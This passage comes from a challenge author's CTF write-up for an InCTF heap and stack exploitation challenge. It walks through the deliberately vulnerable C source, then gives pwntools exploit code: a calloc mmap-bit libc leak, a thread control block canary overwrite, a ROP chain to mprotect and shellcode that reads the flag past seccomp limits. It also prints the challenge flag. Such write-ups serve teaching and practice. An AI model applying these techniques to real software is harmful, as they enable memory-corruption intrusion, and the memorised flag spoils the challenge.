+            <span class="k">case</span> <span class="mi">3</span><span class="p">:</span> <span class="n">Remove</span><span class="p">();</span>
+            <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="mi">4</span><span class="p">:</span> <span class="k">goto</span> <span class="n">Move_On</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="mi">2020</span><span class="p">:</span> <span class="n">Hack</span><span class="p">();</span>
+            <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="mi">5</span><span class="p">:</span> <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nl">Move_On:</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Do u want to leave a feedback for the service?(y/n)"</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ch</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ch</span><span class="p">,</span><span class="s">"y"</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">thread_entry</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">pthread_join</span><span class="p">(</span><span class="n">t1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Thank you!"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s see how we can hack the secret service before getting into the feedback part.</p>
+
+<ol>
+  <li>The <code class="language-plaintext highlighter-rouge">Enroll</code> Function</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Enroll with the use of safe calloc</span>
+<span class="kt">void</span> <span class="nf">Enroll</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">enrolled</span><span class="o">&lt;=</span><span class="mi">2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter Enrollment Index : "</span><span class="p">);</span>
+        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">getInt</span><span class="p">(),</span><span class="n">size</span><span class="p">;</span> 
+        <span class="k">if</span><span class="p">(</span><span class="n">is_enrolled</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid or already enrolled!"</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter size : "</span><span class="p">);</span>
+        <span class="n">size</span> <span class="o">=</span> <span class="n">getInt</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">size</span><span class="o">&lt;</span><span class="mh">0x7f</span> <span class="o">||</span> <span class="n">size</span><span class="o">&gt;=</span><span class="mi">65530</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Size not allowed!"</span><span class="p">);</span>
+            <span class="n">Exit</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">sizes</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Enter your details -&gt; "</span><span class="p">);</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">details</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">sizes</span><span class="p">[</span><span class="n">index</span><span class="p">],</span><span class="mi">1</span><span class="p">);</span>
+       <span class="c1">// printf("Allocation happened at -&gt; %llx\n",details); Debug info , dont mind</span>
+        <span class="n">getInp</span><span class="p">(</span><span class="n">details</span><span class="p">,</span><span class="n">sizes</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+        <span class="n">enrolled_table</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">details</span><span class="p">;</span>
+        <span class="n">is_enrolled</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">enrolled</span><span class="o">++</span><span class="p">;</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Ok! You are enrolled now"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"No more enrollments allowed!"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+</code></pre></div></div>
+
+<p>More or less, you can presume that it is safe.</p>
+
+<ol>
+  <li>The <code class="language-plaintext highlighter-rouge">view</code> Function</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">View</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index of the Enrolled Candidate: "</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">getInt</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">enrolled_table</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="n">is_enrolled</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">||</span> <span class="n">index</span><span class="o">&lt;</span><span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid Index!"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//printf("Viewing chunk %llx\n",enrolled_table[index]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Details of Candidate %u: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">index</span><span class="p">,</span><span class="n">enrolled_table</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>There’s no use <code class="language-plaintext highlighter-rouge">view-after-free</code> with all those checks in plain sight.</p>
+
+<ol>
+  <li>The <code class="language-plaintext highlighter-rouge">Hack</code> function</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">Hack</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">hacked</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"No more hacking allowed!"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index of Enrolled Candidate: "</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">getInt</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">enrolled_table</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">||</span> <span class="n">index</span><span class="o">&lt;</span><span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>      
+    <span class="p">{</span>                                  
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid Index!"</span><span class="p">);</span>        
+        <span class="k">return</span><span class="p">;</span>                        
+    <span class="p">}</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">hack_addr</span> <span class="o">=</span> <span class="n">enrolled_table</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="c1">//printf("Hacking chunk %llx\n",hack_addr);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">hack_addr</span><span class="p">)</span> <span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
+    <span class="n">hacked</span><span class="o">++</span><span class="p">;</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Well this function is obviously vulnerable as the name suggests</p>
+
+<ul>
+  <li>It lets you hack a free chunk.</li>
+  <li>It lets you add <strong>1</strong> to the size of any chunk (free/allocated) but only twice in the whole program.</li>
+</ul>
+
+<p>So what can we do with this?</p>
+
+<p class="notice">If we can add <strong>2</strong> to the size of a free chunk , we end up setting the <code class="language-plaintext highlighter-rouge">mmap-bit</code> of the free chunk , and thus we can fool calloc to return an uninitialized piece of memory.</p>
+
+<p>What this means is that , calloc considers the chunk to be mapped chunk and thus does not call <code class="language-plaintext highlighter-rouge">memset</code> internally and this sets up our libc leak.</p>
+
+<ol>
+  <li>The <code class="language-plaintext highlighter-rouge">Remove</code> function</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Remove function , nulls out the is_enrolled bit , but doesnt null out the table</span>
+<span class="kt">void</span> <span class="nf">Remove</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index of Enrolled Candidate: "</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">getInt</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">enrolled_table</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="n">is_enrolled</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">||</span> <span class="n">index</span><span class="o">&lt;</span><span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid Index"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//printf("Removing chunk %llx\n",enrolled_table[index]);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">enrolled_table</span><span class="p">[</span><span class="n">index</span><span class="p">])</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">enrolled_table</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+    <span class="n">is_enrolled</span><span class="p">[</span><span class="n">index</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="n">enrolled</span><span class="o">--</span><span class="p">;</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As you can see , the remove function doesn’t null out the table , which lets us <code class="language-plaintext highlighter-rouge">hack</code> free chunks.</p>
+
+<p>Now let’s finish up the exploit until leaking libc.</p>
+
+<p>Getting leaks with this information in hand is nothing but a trivial task.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    <span class="c1">#Add 2 chunks ,one of which is uneffected by tcache
+</span>    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x600</span><span class="p">,</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x40</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x40</span><span class="p">)</span>
+    <span class="c1">#Free first one to send to unsorted bin
+</span>    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="c1">#Send the unsorted bin to large bin
+</span>    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x1260</span><span class="p">,</span><span class="s">'unsorted bin'</span><span class="p">)</span>
+    <span class="c1">#Flip the bit to make the free chunk mapped , which could be used for leaking with calloc
+</span>    <span class="n">hack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">hack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="c1">#Now add that chunk to get uninitialised memory from calloc
+</span>    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xd10</span><span class="p">,</span><span class="s">'d'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1">#0x10f0
+</span>    <span class="c1">#view it to leak stuff
+</span>    <span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="c1">#Leaks
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"d"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">re</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1ec1e0</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_base = "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+    <span class="c1">#Done with leaks , move on
+</span></code></pre></div></div>
+
+<p>After getting libc leak , there’s not much you can do with the secret service , so , just move on :P.</p>
+
+<h3 id="the-final-feedback">The Final Feedback</h3>
+
+<p>We have entered the final stage of our program (and exploit too :P) , where we are requested to enter some feedback.</p>
+
+<p>A separate thread is created which calls the thread handler function, <code class="language-plaintext highlighter-rouge">create_feedback</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="nf">thread_entry</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">create_feedback</span><span class="p">();</span>
+    <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">//Create a new thread to handle feedback request</span>
+<span class="kt">void</span> <span class="nf">create_feedback</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">feedback</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"A new thread has been created for feedback"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">feedback</span> <span class="o">&lt;</span> <span class="n">init_0</span><span class="p">())</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter size of feedback: "</span><span class="p">);</span>
+        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter feedback: "</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">size</span><span class="o">&gt;</span><span class="mh">0x70</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Size too large"</span><span class="p">);</span>
+            <span class="n">Exit</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fd_stdout</span> <span class="o">=</span> <span class="n">supress_stdout</span><span class="p">();</span>
+        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fd_stderr</span> <span class="o">=</span> <span class="n">supress_stderr</span><span class="p">();</span>
+        <span class="n">get_inp</span><span class="p">(</span><span class="n">feedback</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Thank you!"</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>There’s a plain integer overflow as there is no check for size being less than zero and size is <code class="language-plaintext highlighter-rouge">int</code>.</p>
+
+<p>But there’s a canary , how do we bypass it?</p>
+
+<p class="notice">So here’s the thing , we are getting write over a region known as <code class="language-plaintext highlighter-rouge">Thread Control Block</code>. This is the place from where canary is actually loaded into the fs segment register for the stack check fail.</p>
+
+<p>Now we have plain overflow and we can assume there’s no canary , cool isn’t it?</p>
+
+<p>Well what next?</p>
+
+<h3 id="rop-and-shellcode-to-grab-that-flag">ROP And Shellcode To Grab That Flag</h3>
+
+<p>The first thing that comes to mind is , call mprotect on the region we have overflow , and then shellcode.
+Well , thats it.</p>
+
+<p>Let’s script it till there.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">move_on</span><span class="p">()</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"service?(y/n)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="s">'y'</span><span class="p">)</span>
+    <span class="c1">#Trigger integer overflow with type confusion bug to get large write on stack
+</span>    <span class="n">sla</span><span class="p">(</span><span class="s">"feedback: "</span><span class="p">,</span><span class="s">'-1'</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>But as you would have noticed , a weird function <code class="language-plaintext highlighter-rouge">supress_stdout</code> is being called which redirects stdout to <code class="language-plaintext highlighter-rouge">/dev/null</code>. So how do we get around it? Simple , you just have to mimic it.</p>
+
+<p>Now all we have to do is , write a simple shellcode.</p>
+
+<p>Wait , one more thing , what about those seccomp constraints which let you read only from fd <code class="language-plaintext highlighter-rouge">0</code> and write only to fd <code class="language-plaintext highlighter-rouge">1</code>.</p>
+
+<ol>
+  <li>To open flag at fd <code class="language-plaintext highlighter-rouge">0</code> , just close fd 0 and open flag , it will open at fd <strong>0</strong> itself.</li>
+  <li>Now you can read the flag at fd <strong>0</strong> and write it to stdout.</li>
+</ol>
+
+<p>Here’s the remaining script.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">#The shellcode first reopens stdout by mimicing the mechanism of supress_stdout function
+</span>    <span class="c1">#It does so by calling dup2 , changing file descriptor of stdout back to 1
+</span>    <span class="c1">#Then we close stdin so that flag gets opened at fd 0.
+</span>    <span class="c1">#After that , we call openat syscall to open flag at fd 0, as open is not allowed
+</span>    <span class="c1">#Finally we read flag in memory and write it out
+</span>    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">'''
+            xor rdi,rdi
+            mov edi,DWORD PTR [rbp-0x88]
+            mov rsi,1
+            mov rax,33
+            syscall
+            mov rax,3
+            syscall
+            mov rax,3
+            mov rdi,0
+            xor rsi,rsi
+            xor rdx,rdx
+            syscall
+            mov rax,257
+            mov rdi,0xffffff9c
+            mov r9,0x67616c66
+            push r9
+            push rsp
+            pop rsi
+            mov rdx,0
+            mov r10,0644
+            syscall
+            mov rax,0
+            mov rdi,0
+            lea rsi,[rsp-0x200]
+            mov rdx,0x50
+            syscall
+            mov rax,1
+            mov rdi,1
+            syscall
+            '''</span><span class="p">)</span>
+    <span class="c1">#Gadgets
+</span>    <span class="n">mprotect</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'mprotect'</span><span class="p">]</span>
+    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+    <span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000027529</span>
+    <span class="n">pop_rdx_junk</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x00000000001626d6</span>
+    <span class="n">mmap_base</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x5000</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"mmap_base = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mmap_base</span><span class="p">))</span>
+    <span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">mmap_base</span> <span class="o">+</span> <span class="mh">0xf20</span>
+    <span class="n">fflush</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'fflush'</span><span class="p">]</span>
+    <span class="n">stdout</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_2_1_stdout_'</span><span class="p">]</span>
+    <span class="n">rbp</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x4130</span>
+    <span class="c1">#Adding ROP chain for buffer overflow vuln, the idea is to overwrite TCB structure from where the segment register actually takes canary for checking ,thus overwriting the original canary and triggering overflow
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x80</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mmap_base</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_junk</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+    <span class="c1">#We intend to call mprotect to make mmaped region itself executable
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mprotect</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">'a'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x8e8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Getting flag'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"feedback: "</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>I have to give credits to <code class="language-plaintext highlighter-rouge">kileak</code> from <a href="https://twitter.com/OpenToAllCTF">OpenToAll</a> for pointing out the unintended solution to my challenge , much appreciated.</p>
+
+<h3 id="flag">Flag</h3>
+
+<p>Here’s the flag</p>
+
+<p><strong>FLAG</strong>: <code class="language-plaintext highlighter-rouge">inctf{wh3r3_d1d_y0u_l4nd_up_f1nally_st4ck_H34p_st4ck_0r_H34p_1963290327101999}</code></p>
+
+<p>All in all , I had lot of fun making the challenge which was intended to teach the participants about 3 vulnerabilities -</p>
+
+<ol>
+  <li>Tricky Format String.</li>
+  <li>Leaking memory from calloc.</li>
+  <li>TCB overwrite.</li>
+</ol>
+
+<p>Here’s the exploit script <a href="https://gist.github.com/PwnVerse/eaec3712c0dfbf136a8ae628cfe2655a">exp.py</a></p>
+:ET
